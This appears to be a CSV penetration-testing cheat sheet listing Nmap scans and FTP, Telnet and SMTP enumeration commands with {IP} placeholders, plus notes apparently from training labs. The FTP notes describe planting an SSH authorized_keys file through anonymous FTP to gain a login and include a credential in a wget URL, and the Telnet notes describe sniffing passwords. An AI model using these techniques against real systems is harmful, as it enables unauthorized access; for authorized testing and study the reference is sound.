Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
Nmap,Nmap,Generic Scans,Kickoff Scan,"Quick scan, Version scan, All Port Scan, UDP Scan ran one at a time in order",nmap -Pn {IP} && nmap -Pn -sS -p- {IP} && nmap -sC -sV -Pn {IP} && nmap -p- -Pn {IP} && sudo nmap -Pn -p- -sU {IP},Verified,1
Nmap,Nmap,Generic Scans,Quick Scan,Quick Nmap Scan,nmap {IP},Verified,2
Nmap,Nmap,Generic Scans,Version Scan,Scan for the Version of the Open Ports,nmap -sC -sV {IP},Verified,3
Nmap,Nmap,Generic Scans,All Port Scan,Scan for All Open Ports,nmap -p- -Pn {IP},Verified,4
Nmap,Nmap,Generic Scans,All Vulns Scan,Scan with All SMB Vuln Scripts,"nmap --script smb-vuln* -p 139,445 {IP}",Verified,5
Nmap,Nmap,Generic Scans,Quiet Scan,Scan Quietly,nmap -Pn -sS -p- {IP},Verified,6
Nmap,Nmap,Generic Scans,UDP Scan,Scan for Open UDP Ports,nmap -Pn -p- -sU {IP},Verified,7
FTP,21,File Transfer Protocol,Notes,Notes for FTP,"#ftp 10.11.1.8
Anonymous
-bi     <<< so that your put is done via binary

wget --mirror 'ftp://ftp_user:UTDRSCH53c""$6hys@10.10.10.59'
^^to download all dirs and files

wget --no-passive-ftp --mirror 'ftp://anonymous:anonymous@10.10.10.98' 
if PASV transfer is disabled

??are you in a users dir??
mkdir .ssh
    --on kali-- 
        ssh-keygen
        enter, enter, enter
        cd .ssh
        cp id_rsa.pub authorized_keys
cd .ssh
put authorized_keys
!!!now you can ssh as the user who's directory you were in!!!

https://book.hacktricks.xyz/pentesting/pentesting-ftp",Verified,1
FTP,21,File Transfer Protocol,Banner Grab,Grab Banner,telnet -vn {IP} 21,Verified,2
FTP,21,File Transfer Protocol,Cert Grab,Get Certificate if any,openssl s_client -connect {IP}:21 -starttls ftp,Verified,3
FTP,21,File Transfer Protocol,Browser Connection,Connect with Browser (Firefox),#ftp://anonymous:anonymous@{IP},Verified,4
Telnet,23,Telnet,Notes,Telnet Notes,"#wireshark to hear creds being passed
tcp.port == 23 and ip.addr != myip
https://book.hacktricks.xyz/pentesting/pentesting-telnet",Verified,1
Telnet,23,Telnet,Banner Grab,Grab Banner,nc -vn {IP} 23,Verified,2
Telnet,23,Telnet,Nmap Scripts,Run nmap scripts for telnet,"nmap -n -sV -Pn --script ""*telnet*"" -p 23 {IP}",Verified,3
SMTP,25,Simple Mail Transfer Protocol,Banner Grab,Grab Banner,nc -vn {IP} 25,Verified,1
